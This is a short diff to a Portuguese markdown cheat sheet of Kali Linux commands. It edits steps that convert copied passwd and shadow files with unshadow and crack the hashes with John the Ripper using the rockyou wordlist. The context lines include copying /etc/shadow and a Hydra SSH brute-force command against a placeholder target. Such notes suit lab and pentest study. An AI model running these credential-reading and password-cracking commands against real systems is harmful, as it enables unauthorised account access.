@@ -69,9 +69,7 @@ cp /etc/shadow /tmp/shadow
 ```
 ## Converter arquivos de hash para o formato compativel do John The Ripper (Kali Linux)
 ```
-sudo bash -c " \
 unshadow passwd shadow > hashes-linux.txt
-"
 ```
 ## Executar Hydra para quebrar senhas de usuários via SSH (Kali Linux)
 ```
@@ -79,7 +77,7 @@ hydra -l name_user -P /usr/share/wordlists/john.lst ssh://<Target_IP>
 ```
 ## Executar John The Ripper para quebrar hashs das senhas dos usuários (Kali Linux)
 ```
-john /tmp/hashes --wordlist=/usr/share/wordlists/john.lst --format=crypt
+john --wordlist=/usr/share/wordlists/rockyou.txt --format=crypt hashes-linux.txt
 ```
 ## Remover usuários do Linux
 ```
